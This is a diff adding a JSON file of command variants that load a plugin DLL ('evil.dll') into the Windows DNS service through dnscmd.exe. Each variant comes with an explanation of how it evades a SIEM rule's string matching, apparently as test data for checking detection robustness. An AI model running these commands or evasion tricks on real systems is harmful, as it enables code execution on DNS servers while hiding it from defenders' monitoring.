@@ -1,0 +1,22 @@
+[
+  {
+    "output": "dnscmd.exe -config -serverlevelplugindll C:\\Temp\\evil.dll",
+    "explanation": "Substitution technique: Built-in Microsoft binaries leveraging standard Windows CLI parsing frameworks traditionally treat hyphens ('-') interchangeably with forward slashes ('/') as argument switch prefixes. Substituting '/config' and '/serverlevelplugindll' with '-config' and '-serverlevelplugindll' completely breaks the literal string detection defined in the rule, while dnscmd.exe handles the parameter switches identically."
+  },
+  {
+    "output": "dnscmd.exe \"/config\" \"/serverlevelplugindll\" C:\\Temp\\evil.dll",
+    "explanation": "Insertion technique: Enclosing the core action switches inside double quotes ('\"/config\"' and '\"/serverlevelplugindll\"') disrupts the continuous literal sequence matching monitored by the SIEM engine. The standard Windows command line parser transparently peels off the outer quote boundaries during initialization, fulfilling the operational requirements of the test scenario."
+  },
+  {
+    "output": "cmd.exe /c dnscmd.exe /con^fig /serverlevelplug^indll C:\\Temp\\evil.dll",
+    "explanation": "Insertion technique: Spawning the execution through cmd.exe permits the insertion of a command shell caret escape character ('^') inside the switch names. The parent console subsystem filters this token out entirely prior to initiating the child context, logging '/con^fig' and '/serverlevelplug^indll' in process creation event streams and successfully subverting the rule."
+  },
+  {
+    "output": "dnscmd.exe /serverlevelplugindll C:\\Temp\\evil.dll /config",
+    "explanation": "Reordering technique: Swapping the sequential layout order of the command arguments. Although this specific rule utilizes a multi-token 'contains|all' modifier and will still evaluate true against the simple presence of the tokens, reordering testing parameters commonly breaks fragile custom order rules or positional state machine parsing layers."
+  },
+  {
+    "output": "dnscmd.exe\t/config\t/serverlevelplugindll\tC:\\Temp\\evil.dll",
+    "explanation": "Substitution technique: Replacing the required single space character boundaries flanking the parameters with horizontal tab characters ('\\t'). The native Windows execution environment tokenizes horizontal tabs as valid whitespace parameter separators, bypassing strict space-padded string checks or parsing anomalies in naive log management utilities."
+  }
+]
